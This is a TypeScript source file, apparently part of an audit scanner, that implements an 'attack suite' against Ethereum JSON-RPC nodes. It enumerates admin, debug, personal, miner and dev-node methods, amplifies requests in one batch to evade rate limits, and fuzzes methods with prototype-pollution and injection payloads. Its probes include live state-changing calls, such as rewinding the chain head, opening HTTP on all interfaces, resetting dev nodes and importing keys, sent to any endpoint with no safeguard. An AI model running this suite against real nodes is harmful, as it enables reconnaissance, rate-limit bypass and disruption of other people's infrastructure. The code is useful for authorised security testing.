/**
 * JSON-RPC Attack Suite
 * =====================
 * Implements the exact techniques used by attackers against JSON-RPC endpoints:
 *
 * 1. Batch Amplification Attack   — 150+ methods in a single HTTP request, bypassing
 *                                   per-request rate limits that only count HTTP calls
 * 2. Cache Probe / Enumeration    — "Method not found" vs "Unauthorized" response
 *                                   differential reveals hidden API surface even on
 *                                   nodes that appear "secured"
 * 3. Namespace Discovery          — probe all known namespaces: eth, net, web3,
 *                                   personal, admin, debug, txpool, miner, parity,
 *                                   trace, erigon, bor, alchemy, hardhat
 * 4. Parameter Type Fuzzing       — send null/object/array/large-string/prototype-
 *                                   pollution payloads to each exposed method to
 *                                   trigger parsing bypasses and unexpected behaviour
 * 5. Authorization Escalation     — authenticated path vs unauthenticated path
 *                                   differential to detect method-level auth gaps
 *
 * References:
 *   StackHawk "JSON-RPC Security: Best Practices" (March 2026)
 *   HackTricks "Rate Limit Bypass"
 *   Alchemy "RPC Security Guide"
 */

export interface MethodProbeResult {
  method: string;
  namespace: string;
  status: "exposed" | "auth-required" | "not-found" | "error" | "fuzz-hit";
  /** Distinguishing error code from the response (e.g. -32601, -32000) */
  errorCode?: number;
  /** Exact error message returned — shows API surface even for "blocked" methods */
  errorMessage?: string;
  responseTime: number;
  result?: unknown;
  /** True when the method exists but returns auth error — information leak */
  isInfoLeak: boolean;
  /** The raw params sent for this probe */
  params: unknown[];
}

export interface FuzzResult {
  method: string;
  payload: string;
  payloadDescription: string;
  triggered: boolean;
  statusCode?: number;
  errorCode?: number;
  errorMessage?: string;
  unexpectedBehaviour: string;
}

export interface BatchAmplificationResult {
  /** How many methods were sent in the single batch */
  batchSize: number;
  /** How many responded (successfully or with auth error) */
  responding: number;
  /** Did the server process the full batch (rate-limit bypass confirmed)? */
  rateLimitBypassed: boolean;
  /** If the server rejected or truncated the batch */
  batchRejected: boolean;
  rejectionReason?: string;
  responseTimeMs: number;
  /** Methods that responded inside the batch */
  respondingMethods: string[];
  /** Error message if batch request itself failed */
  batchError?: string;
}

export interface RpcAttackResult {
  endpoint: string;
  scanTimeMs: number;
  /** Total unique methods probed */
  totalProbed: number;
  /** Methods that returned a real result (fully exposed, no auth) */
  fullyExposed: string[];
  /** Methods that exist but return auth errors — info leak */
  authRequired: string[];
  /** Methods not found (unknown to the server) */
  notFound: number;
  /** Namespaces discovered (has at least one exposed or auth-required method) */
  discoveredNamespaces: string[];
  /** All method results */
  methods: MethodProbeResult[];
  /** Batch amplification attack result */
  batchAttack: BatchAmplificationResult;
  /** Parameter fuzzing results */
  fuzzResults: FuzzResult[];
  /** Response differential map: error code → list of methods returning it */
  responseDifferential: Record<string, string[]>;
  /** Overall risk findings */
  criticalFindings: string[];
  riskScore: number;
}

// ── Method Inventory ──────────────────────────────────────────────────────────
// Every method an attacker probes across all known Ethereum namespaces

const ALL_METHODS: Array<{ method: string; namespace: string; params: unknown[] }> = [
  // eth namespace — standard
  ...([
    ["eth_blockNumber",                []],
    ["eth_chainId",                    []],
    ["eth_gasPrice",                   []],
    ["eth_maxPriorityFeePerGas",       []],
    ["eth_syncing",                    []],
    ["eth_mining",                     []],
    ["eth_hashrate",                   []],
    ["eth_coinbase",                   []],
    ["eth_accounts",                   []],
    ["eth_getBalance",                 ["0x0000000000000000000000000000000000000000","latest"]],
    ["eth_getTransactionCount",        ["0x0000000000000000000000000000000000000000","latest"]],
    ["eth_getCode",                    ["0x0000000000000000000000000000000000000000","latest"]],
    ["eth_getStorageAt",               ["0x0000000000000000000000000000000000000000","0x0","latest"]],
    ["eth_call",                       [{"to":"0x0000000000000000000000000000000000000000","data":"0x"},"latest"]],
    ["eth_estimateGas",                [{"to":"0x0000000000000000000000000000000000000000"}]],
    ["eth_getBlockByNumber",           ["latest",false]],
    ["eth_getBlockByHash",             ["0x0000000000000000000000000000000000000000000000000000000000000000",false]],
    ["eth_getTransactionByHash",       ["0x0000000000000000000000000000000000000000000000000000000000000000"]],
    ["eth_getTransactionReceipt",      ["0x0000000000000000000000000000000000000000000000000000000000000000"]],
    ["eth_getBlockTransactionCountByNumber", ["latest"]],
    ["eth_getUncleByBlockNumberAndIndex",    ["latest","0x0"]],
    ["eth_getLogs",                    [{"fromBlock":"latest","toBlock":"latest"}]],
    ["eth_sendRawTransaction",         ["0x00"]],
    ["eth_sign",                       ["0x0000000000000000000000000000000000000000","0x00"]],
    ["eth_signTransaction",            [{"from":"0x0000000000000000000000000000000000000000","to":"0x0000000000000000000000000000000000000000","value":"0x0"}]],
    ["eth_sendTransaction",            [{"from":"0x0000000000000000000000000000000000000000","to":"0x0000000000000000000000000000000000000000","value":"0x0"}]],
    ["eth_protocolVersion",            []],
    ["eth_feeHistory",                 ["0x1","latest",[]]],
    ["eth_createAccessList",           [{"to":"0x0000000000000000000000000000000000000000"},"latest"]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "eth", params })),

  // net namespace
  ...([
    ["net_version",    []],
    ["net_listening",  []],
    ["net_peerCount",  []],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "net", params })),

  // web3 namespace
  ...([
    ["web3_clientVersion", []],
    ["web3_sha3",          ["0x68656c6c6f20776f726c64"]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "web3", params })),

  // personal namespace — DANGEROUS (Geth private API)
  ...([
    ["personal_listAccounts",          []],
    ["personal_newAccount",            ["test-password"]],
    ["personal_unlockAccount",         ["0x0000000000000000000000000000000000000000","",0]],
    ["personal_lockAccount",           ["0x0000000000000000000000000000000000000000"]],
    ["personal_importRawKey",          ["0000000000000000000000000000000000000000000000000000000000000001","password"]],
    ["personal_sign",                  ["0x00","0x0000000000000000000000000000000000000000",""]],
    ["personal_ecRecover",             ["0x00","0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"]],
    ["personal_sendTransaction",       [{"from":"0x0000000000000000000000000000000000000000","to":"0x0000000000000000000000000000000000000000","value":"0x0"},""]],
    ["personal_signTransaction",       [{"from":"0x0000000000000000000000000000000000000000","to":"0x0000000000000000000000000000000000000000","value":"0x0"},""]],
    ["personal_listWallets",           []],
    ["personal_openWallet",            ["keystore://",""]],
    ["personal_deriveAccount",         ["keystore://","m/44'/60'/0'/0",false]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "personal", params })),

  // admin namespace — CRITICAL (Geth admin API)
  ...([
    ["admin_peers",             []],
    ["admin_nodeInfo",          []],
    ["admin_datadir",           []],
    ["admin_addPeer",           ["enode://00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000@127.0.0.1:30303"]],
    ["admin_removePeer",        ["enode://00@127.0.0.1:30303"]],
    ["admin_exportChain",       ["/tmp/chain.rlp"]],
    ["admin_importChain",       ["/tmp/chain.rlp"]],
    ["admin_startHTTP",         ["0.0.0.0",8545,"","eth,net,web3"]],
    ["admin_stopHTTP",          []],
    ["admin_startWS",           ["0.0.0.0",8546,"","eth,net,web3"]],
    ["admin_stopWS",            []],
    ["admin_sleepBlocks",       [1,3]],
    ["admin_getStats",          []],
    ["admin_stackTrace",        []],
    ["admin_memStats",          []],
    ["admin_gcStats",           []],
    ["admin_verbosity",         [5]],
    ["admin_vmodule",           ["p2p=5"]],
    ["admin_statedb",           []],
    ["admin_trustedPeers",      []],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "admin", params })),

  // debug namespace — VERY DANGEROUS
  ...([
    ["debug_traceTransaction",         ["0x0000000000000000000000000000000000000000000000000000000000000000"]],
    ["debug_traceBlockByNumber",       ["latest",{}]],
    ["debug_traceBlockByHash",         ["0x0000000000000000000000000000000000000000000000000000000000000000",{}]],
    ["debug_traceCall",                [{"to":"0x0000000000000000000000000000000000000000"},"latest",{}]],
    ["debug_storageRangeAt",           ["0x0000000000000000000000000000000000000000000000000000000000000000",0,"0x0000000000000000000000000000000000000000","0x00",10]],
    ["debug_getHeaderRlp",             ["0x1"]],
    ["debug_getBlockRlp",              ["0x1"]],
    ["debug_printBlock",               ["0x1"]],
    ["debug_chaindbProperty",          ["leveldb.stats"]],
    ["debug_chaindbCompact",           []],
    ["debug_setHead",                  ["0x1"]],
    ["debug_seedHash",                 ["0x1"]],
    ["debug_dumpBlock",                ["latest"]],
    ["debug_accountRange",             ["latest",null,10,false,false,false]],
    ["debug_gcStats",                  []],
    ["debug_memStats",                 []],
    ["debug_stacks",                   []],
    ["debug_freeOSMemory",             []],
    ["debug_setGCPercent",             [20]],
    ["debug_writeBlockProfile",        ["/tmp/block.prof"]],
    ["debug_writeMemProfile",          ["/tmp/mem.prof"]],
    ["debug_writeMutexProfile",        ["/tmp/mutex.prof"]],
    ["debug_blockProfile",             ["/tmp/block.prof",5]],
    ["debug_cpuProfile",               ["/tmp/cpu.prof",5]],
    ["debug_goTrace",                  ["/tmp/trace",5]],
    ["debug_mutexProfile",             ["/tmp/mutex.prof",5]],
    ["debug_verbosity",                [5]],
    ["debug_vmodule",                  ["p2p=5"]],
    ["debug_backtraceAt",              ["server.go:443"]],
    ["debug_startGoTrace",             ["/tmp/trace"]],
    ["debug_stopGoTrace",              []],
    ["debug_startCPUProfile",          ["/tmp/cpu"]],
    ["debug_stopCPUProfile",           []],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "debug", params })),

  // txpool namespace
  ...([
    ["txpool_content",    []],
    ["txpool_inspect",    []],
    ["txpool_status",     []],
    ["txpool_contentFrom",["0x0000000000000000000000000000000000000000"]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "txpool", params })),

  // miner namespace (Geth)
  ...([
    ["miner_start",          [1]],
    ["miner_stop",           []],
    ["miner_setEtherbase",   ["0x0000000000000000000000000000000000000000"]],
    ["miner_setExtra",       ["QuantumAudit"]],
    ["miner_setGasLimit",    ["0x989680"]],
    ["miner_setGasPrice",    ["0x1"]],
    ["miner_setRecommitInterval", [1000]],
    ["miner_getHashrate",    []],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "miner", params })),

  // parity/OpenEthereum namespace
  ...([
    ["parity_netPeers",           []],
    ["parity_allAccountsInfo",    []],
    ["parity_listAccounts",       [100,null,"latest"]],
    ["parity_exportAccount",      [{"address":"0x0000000000000000000000000000000000000000","password":""},"password"]],
    ["parity_chain",              []],
    ["parity_chainStatus",        []],
    ["parity_nodeKind",           []],
    ["parity_pendingTransactions",[100,null]],
    ["parity_localTransactions",  []],
    ["parity_futureTransactions", []],
    ["parity_setMinGasPrice",     ["0x1"]],
    ["parity_gasFloorTarget",     []],
    ["parity_netChain",           []],
    ["parity_netPort",            []],
    ["parity_netMaxPeers",        []],
    ["parity_versionInfo",        []],
    ["parity_getBlockHeaderByNumber", ["latest"]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "parity", params })),

  // trace namespace (Parity/Erigon)
  ...([
    ["trace_call",             [{"to":"0x0000000000000000000000000000000000000000"},["trace"],"latest"]],
    ["trace_callMany",         [[{"to":"0x0000000000000000000000000000000000000000"}],["trace"],"latest"]],
    ["trace_rawTransaction",   ["0x00",["trace"]]],
    ["trace_replayTransaction",["0x0000000000000000000000000000000000000000000000000000000000000000",["trace"]]],
    ["trace_replayBlockTransactions",["latest",["trace"]]],
    ["trace_block",            ["latest"]],
    ["trace_filter",           [{"fromBlock":"latest","toBlock":"latest"}]],
    ["trace_get",              ["0x0000000000000000000000000000000000000000000000000000000000000000",[0]]],
    ["trace_transaction",      ["0x0000000000000000000000000000000000000000000000000000000000000000"]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "trace", params })),

  // erigon namespace
  ...([
    ["erigon_getHeaderByNumber",     ["0x1"]],
    ["erigon_getHeaderByHash",       ["0x0000000000000000000000000000000000000000000000000000000000000000"]],
    ["erigon_getLogsByHash",         ["0x0000000000000000000000000000000000000000000000000000000000000000"]],
    ["erigon_forks",                 []],
    ["erigon_nodeInfo",              []],
    ["erigon_getBlockByTimestamp",   ["0x60000000",false]],
    ["erigon_getBadBlocks",          []],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "erigon", params })),

  // bor namespace (Polygon)
  ...([
    ["bor_getSnapshot",        ["0x1"]],
    ["bor_getSnapshotProposer",["0x1"]],
    ["bor_getAuthor",          ["0x1"]],
    ["bor_getCurrentValidators",[]],
    ["bor_getRootHash",        ["0x1","0x2"]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "bor", params })),

  // Alchemy/provider-specific
  ...([
    ["alchemy_getTokenMetadata",     ["0x0000000000000000000000000000000000000000"]],
    ["alchemy_getAssetTransfers",    [{"fromBlock":"0x0","toBlock":"latest","category":["external"]}]],
    ["alchemy_getTokenBalances",     ["0x0000000000000000000000000000000000000000"]],
    ["alchemy_getTokenAllowance",    [{"contract":"0x0000000000000000000000000000000000000000","owner":"0x0000000000000000000000000000000000000000","spender":"0x0000000000000000000000000000000000000000"}]],
    ["alchemy_simulateExecution",    [{"from":"0x0000000000000000000000000000000000000000","to":"0x0000000000000000000000000000000000000000","value":"0x0"}]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "alchemy", params })),

  // hardhat/foundry dev node specific
  ...([
    ["hardhat_impersonateAccount",          ["0x0000000000000000000000000000000000000000"]],
    ["hardhat_stopImpersonatingAccount",    ["0x0000000000000000000000000000000000000000"]],
    ["hardhat_setBalance",                  ["0x0000000000000000000000000000000000000000","0xDE0B6B3A7640000"]],
    ["hardhat_setCode",                     ["0x0000000000000000000000000000000000000000","0x00"]],
    ["hardhat_setStorageAt",                ["0x0000000000000000000000000000000000000000","0x0","0x0000000000000000000000000000000000000000000000000000000000000001"]],
    ["hardhat_mine",                        ["0x1"]],
    ["hardhat_reset",                       []],
    ["hardhat_setNextBlockBaseFeePerGas",   ["0x1"]],
    ["hardhat_setBlockGasLimit",            ["0x1C9C380"]],
    ["anvil_impersonateAccount",            ["0x0000000000000000000000000000000000000000"]],
    ["anvil_setBalance",                    ["0x0000000000000000000000000000000000000000","0xDE0B6B3A7640000"]],
    ["anvil_mine",                          ["0x1"]],
    ["anvil_reset",                         []],
    ["anvil_setCode",                       ["0x0000000000000000000000000000000000000000","0x00"]],
  ] as Array<[string, unknown[]]>).map(([method, params]) => ({ method, namespace: "devnode", params })),
];

// ── Parameter Fuzzing Payloads ─────────────────────────────────────────────────
interface FuzzPayload {
  description: string;
  params: unknown;
}
const FUZZ_PAYLOADS: FuzzPayload[] = [
  { description: "null params",                    params: null },
  { description: "empty object instead of array",  params: {} },
  { description: "boolean true instead of params", params: true },
  { description: "integer 0 instead of params",    params: 0 },
  { description: "empty array",                    params: [] },
  { description: "array of nulls",                 params: [null, null, null] },
  { description: "array of empty objects",         params: [{}, {}, {}] },
  { description: "prototype pollution payload",    params: [{"__proto__":{"admin":true},"constructor":{"prototype":{"admin":true}}}] },
  { description: "very large string (10KB)",       params: ["A".repeat(10240)] },
  { description: "numeric string as address",      params: ["12345678901234567890"] },
  { description: "SQL injection in string param",  params: ["' OR '1'='1"] },
  { description: "negative block number",          params: ["-1"] },
  { description: "non-hex block number",           params: ["999999999999"] },
  { description: "unicode in method param",        params: ["\u0000\uFFFF\u202E"] },
  { description: "deeply nested object",           params: [{"a":{"b":{"c":{"d":{"e":{"f":{}}}}}}}] },
  { description: "array as address param",         params: [["0x0000000000000000000000000000000000000000"]] },
  { description: "object as block tag",            params: ["latest", {"block":"latest"}] },
];

// ── Core RPC Call ─────────────────────────────────────────────────────────────
interface RpcResponse {
  result?: unknown;
  error?: { code?: number; message?: string; data?: unknown };
  responseTime: number;
  httpStatus?: number;
  networkError?: string;
}

async function rawRpcCall(
  endpoint: string,
  id: number,
  method: string,
  params: unknown,
  timeoutMs = 7000
): Promise<RpcResponse> {
  const start = Date.now();
  try {
    const resp = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ jsonrpc: "2.0", id, method, params }),
      signal: AbortSignal.timeout(timeoutMs),
    });
    const responseTime = Date.now() - start;
    let body: Record<string, unknown>;
    try { body = await resp.json() as Record<string, unknown>; }
    catch { return { responseTime, httpStatus: resp.status, networkError: "Invalid JSON response" }; }
    return {
      result: body.result,
      error: body.error as RpcResponse["error"],
      responseTime,
      httpStatus: resp.status,
    };
  } catch (err) {
    return {
      responseTime: Date.now() - start,
      networkError: err instanceof Error ? err.message : "Network error",
    };
  }
}

// ── Response Classifier ───────────────────────────────────────────────────────
function classifyResponse(r: RpcResponse): {
  status: MethodProbeResult["status"];
  isInfoLeak: boolean;
  errorCode?: number;
  errorMessage?: string;
} {
  if (r.networkError) return { status: "error", isInfoLeak: false, errorMessage: r.networkError };

  // Method has a real result → fully exposed
  if (r.result !== null && r.result !== undefined) {
    return { status: "exposed", isInfoLeak: false };
  }

  const code = r.error?.code;
  const msg = (r.error?.message ?? "").toLowerCase();

  // Method not found → does not exist in this node
  if (code === -32601 || msg.includes("method not found") || msg.includes("does not exist") || msg.includes("not supported")) {
    return { status: "not-found", isInfoLeak: false, errorCode: code ?? -32601, errorMessage: r.error?.message };
  }

  // Auth errors → method EXISTS but is protected (this is the info leak!)
  if (
    code === -32001 || code === -32002 || code === -32003 ||
    code === 401 || code === 403 ||
    msg.includes("unauthorized") || msg.includes("forbidden") ||
    msg.includes("authentication") || msg.includes("permission") ||
    msg.includes("access denied") || msg.includes("not allowed") ||
    msg.includes("requires auth") || (r.httpStatus === 401 || r.httpStatus === 403)
  ) {
    // THE KEY HACKER TECHNIQUE: "Unauthorized" means the method exists.
    // The difference between "not found" and "unauthorized" reveals hidden API surface.
    return { status: "auth-required", isInfoLeak: true, errorCode: code, errorMessage: r.error?.message };
  }

  // Any other error with result=null may still indicate the method exists
  if (r.error) {
    return { status: "error", isInfoLeak: false, errorCode: code, errorMessage: r.error.message };
  }

  // result=null without error — some nodes return null for valid but empty results
  return { status: "exposed", isInfoLeak: false };
}

// ── 1. Batch Amplification Attack ─────────────────────────────────────────────
async function runBatchAmplification(endpoint: string, methods: typeof ALL_METHODS): Promise<BatchAmplificationResult> {
  const start = Date.now();
  const batchPayload = methods.map((m, i) => ({
    jsonrpc: "2.0", id: i + 1, method: m.method, params: m.params,
  }));

  try {
    const resp = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(batchPayload),
      signal: AbortSignal.timeout(30000),
    });
    const responseTime = Date.now() - start;

    if (!resp.ok && resp.status !== 200) {
      return {
        batchSize: methods.length,
        responding: 0,
        rateLimitBypassed: false,
        batchRejected: true,
        rejectionReason: `HTTP ${resp.status}: batch requests rejected at HTTP level`,
        responseTimeMs: responseTime,
        respondingMethods: [],
      };
    }

    let body: unknown;
    try { body = await resp.json(); } catch {
      return {
        batchSize: methods.length, responding: 0, rateLimitBypassed: false,
        batchRejected: true, rejectionReason: "Server returned invalid JSON for batch — may not support batch mode",
        responseTimeMs: responseTime, respondingMethods: [],
      };
    }

    // Server may return a single error (batch not supported) or an array
    if (!Array.isArray(body)) {
      const err = (body as Record<string, unknown>)?.error;
      const msg = (err as Record<string, unknown>)?.message ?? "Batch not supported";
      return {
        batchSize: methods.length, responding: 0, rateLimitBypassed: false,
        batchRejected: true, rejectionReason: String(msg),
        responseTimeMs: responseTime, respondingMethods: [],
      };
    }

    const responses = body as Array<Record<string, unknown>>;
    const respondingMethods: string[] = [];
    let responding = 0;

    for (const r of responses) {
      const method = methods.find(m => m.method === batchPayload.find(p => p.id === r.id)?.method);
      if (!method) continue;
      const err = r.error as Record<string, unknown> | undefined;
      const errCode = err?.code as number | undefined;
      const errMsg = String(err?.message ?? "").toLowerCase();
      const isNotFound = errCode === -32601 || errMsg.includes("method not found");
      if (!isNotFound) {
        responding++;
        respondingMethods.push(method.method);
      }
    }

    // Rate-limit bypass is confirmed if we got responses for methods that individual calls
    // would have been rate-limited for (we infer this if responding > 5 in under 10s)
    const rateLimitBypassed = responding > 5 && responseTime < 10000;

    return {
      batchSize: methods.length,
      responding,
      rateLimitBypassed,
      batchRejected: false,
      responseTimeMs: responseTime,
      respondingMethods,
    };
  } catch (err) {
    return {
      batchSize: methods.length, responding: 0, rateLimitBypassed: false,
      batchRejected: true, rejectionReason: "Network error during batch request",
      responseTimeMs: Date.now() - start, respondingMethods: [],
      batchError: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

// ── 2. Parameter Fuzzing ──────────────────────────────────────────────────────
async function runParameterFuzzing(
  endpoint: string,
  exposedMethods: string[]
): Promise<FuzzResult[]> {
  const results: FuzzResult[] = [];
  // Only fuzz exposed methods (ones that have real results or auth errors)
  const targets = exposedMethods.slice(0, 8); // limit to first 8 to keep reasonable time

  for (const method of targets) {
    for (const payload of FUZZ_PAYLOADS) {
      const r = await rawRpcCall(endpoint, 9000, method, payload.params, 5000);
      const errMsg = r.error?.message ?? r.networkError ?? "";
      const errCode = r.error?.code;

      // Determine if the fuzz triggered "unexpected behaviour":
      // - A result where we expected an error (type confusion bypass)
      // - An error that's NOT "invalid params" (unexpected parser path)
      // - HTTP 500 (server crash/panic triggered)
      const isInvalidParamsError = errCode === -32602 || errMsg.toLowerCase().includes("invalid param");
      const triggered = (
        (r.result !== null && r.result !== undefined) ||      // got a result from malformed input
        (r.httpStatus !== undefined && r.httpStatus >= 500) || // server error
        (!isInvalidParamsError && !!r.error && errCode !== -32601) // unexpected error path
      );

      let unexpectedBehaviour = "Normal rejection (expected)";
      if (r.result !== null && r.result !== undefined) {
        unexpectedBehaviour = "RESULT RETURNED for malformed input — potential type confusion bypass";
      } else if (r.httpStatus && r.httpStatus >= 500) {
        unexpectedBehaviour = `HTTP ${r.httpStatus} — server panic/crash triggered by this payload`;
      } else if (!isInvalidParamsError && r.error && errCode !== -32601) {
        unexpectedBehaviour = `Unexpected error path (${errCode}): ${errMsg.slice(0, 120)}`;
      }

      if (triggered) {
        results.push({
          method, payload: JSON.stringify(payload.params).slice(0, 100),
          payloadDescription: payload.description,
          triggered: true,
          statusCode: r.httpStatus,
          errorCode: errCode,
          errorMessage: errMsg.slice(0, 200),
          unexpectedBehaviour,
        });
      }
    }
  }
  return results;
}

// ── Main Attack Runner ────────────────────────────────────────────────────────
export async function runRpcAttackSuite(endpoint: string): Promise<RpcAttackResult> {
  const globalStart = Date.now();

  // Step 1: Run individual method probes in batches of 8 for speed
  const methodResults: MethodProbeResult[] = [];
  const BATCH = 8;
  for (let i = 0; i < ALL_METHODS.length; i += BATCH) {
    const chunk = ALL_METHODS.slice(i, i + BATCH);
    const chunkResults = await Promise.all(
      chunk.map(async (def, j) => {
        const r = await rawRpcCall(endpoint, i + j + 1, def.method, def.params);
        const classified = classifyResponse(r);
        return {
          method: def.method,
          namespace: def.namespace,
          ...classified,
          responseTime: r.responseTime,
          result: classified.status === "exposed" ? r.result : undefined,
          params: def.params,
        } satisfies MethodProbeResult;
      })
    );
    methodResults.push(...chunkResults);
  }

  // Step 2: Run batch amplification attack
  const batchAttack = await runBatchAmplification(endpoint, ALL_METHODS);

  // Step 3: Fuzz exposed and auth-required methods
  const fuzzTargets = methodResults
    .filter(m => m.status === "exposed" || m.status === "auth-required")
    .map(m => m.method);
  const fuzzResults = await runParameterFuzzing(endpoint, fuzzTargets);

  // Aggregate results
  const fullyExposed = methodResults.filter(m => m.status === "exposed").map(m => m.method);
  const authRequired = methodResults.filter(m => m.status === "auth-required").map(m => m.method);
  const notFoundCount = methodResults.filter(m => m.status === "not-found").length;

  const discoveredNamespaces = [...new Set(
    methodResults
      .filter(m => m.status === "exposed" || m.status === "auth-required")
      .map(m => m.namespace)
  )];

  // Build response differential map (the cache probing hacker technique)
  const differential: Record<string, string[]> = {};
  for (const m of methodResults) {
    if (m.errorCode !== undefined) {
      const key = `${m.errorCode}: ${m.errorMessage?.slice(0, 60) ?? ""}`;
      if (!differential[key]) differential[key] = [];
      differential[key].push(m.method);
    }
  }

  // Build critical findings
  const criticalFindings: string[] = [];
  const dangerousNamespacesExposed = discoveredNamespaces.filter(n => ["personal","admin","debug","miner"].includes(n));
  if (dangerousNamespacesExposed.length > 0) {
    criticalFindings.push(`CRITICAL: Dangerous namespaces exposed: ${dangerousNamespacesExposed.join(", ")} — these should NEVER be publicly accessible`);
  }
  if (fullyExposed.includes("eth_accounts") || fullyExposed.includes("personal_listAccounts")) {
    criticalFindings.push("CRITICAL: Managed wallet accounts are publicly enumerable — attacker can see all addresses");
  }
  if (fullyExposed.some(m => m.startsWith("txpool_"))) {
    criticalFindings.push("HIGH: Full mempool visible — enables front-running and private transaction extraction");
  }
  if (batchAttack.rateLimitBypassed) {
    criticalFindings.push(`HIGH: Rate-limit bypass via batch requests confirmed — ${batchAttack.responding} methods responded in single HTTP request`);
  }
  if (batchAttack.batchRejected === false && batchAttack.batchSize > 50) {
    criticalFindings.push(`MEDIUM: Server accepts large batch requests (${batchAttack.batchSize} calls/request) — brute-force amplification is possible`);
  }
  if (authRequired.length > 0) {
    criticalFindings.push(`INFO LEAK: ${authRequired.length} methods return "Unauthorized" instead of "Method not found" — confirms these methods exist and reveals API surface to attackers`);
  }
  if (fuzzResults.filter(f => f.triggered).length > 0) {
    const triggered = fuzzResults.filter(f => f.triggered);
    criticalFindings.push(`HIGH: ${triggered.length} parameter fuzzing payload(s) triggered unexpected behaviour — parser vulnerabilities present`);
  }
  if (fullyExposed.some(m => m.startsWith("hardhat_") || m.startsWith("anvil_"))) {
    criticalFindings.push("CRITICAL: Dev node methods (hardhat/anvil) are publicly exposed — attacker can mint tokens, set balances, and impersonate any account");
  }
  if (fullyExposed.some(m => m.startsWith("debug_"))) {
    criticalFindings.push("CRITICAL: Debug namespace is publicly accessible — full EVM trace and account state dumps available to anyone");
  }

  const dangerousExposed = fullyExposed.filter(m => {
    const ns = m.split("_")[0];
    return ["personal","admin","debug","miner","hardhat","anvil"].includes(ns ?? "");
  });
  const riskScore = Math.min(100,
    dangerousExposed.length * 20 +
    authRequired.filter(m => {
      const ns = m.split("_")[0];
      return ["personal","admin","debug","miner"].includes(ns ?? "");
    }).length * 5 +
    (batchAttack.rateLimitBypassed ? 15 : 0) +
    fuzzResults.filter(f => f.triggered).length * 8 +
    fullyExposed.filter(m => ["eth_accounts","eth_sign","eth_sendTransaction","eth_signTransaction"].includes(m)).length * 15
  );

  return {
    endpoint,
    scanTimeMs: Date.now() - globalStart,
    totalProbed: ALL_METHODS.length,
    fullyExposed,
    authRequired,
    notFound: notFoundCount,
    discoveredNamespaces,
    methods: methodResults,
    batchAttack,
    fuzzResults,
    responseDifferential: differential,
    criticalFindings,
    riskScore,
  };
}
